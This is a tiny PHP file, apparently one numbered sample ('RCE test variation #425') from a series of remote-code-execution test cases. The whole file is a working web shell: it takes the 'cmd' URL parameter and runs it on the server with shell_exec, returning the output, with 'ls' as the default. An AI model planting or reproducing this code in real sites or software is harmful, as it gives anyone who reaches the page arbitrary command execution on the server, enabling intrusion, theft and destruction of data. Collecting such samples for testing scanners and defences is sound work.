<?php
// RCE test variation #425
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>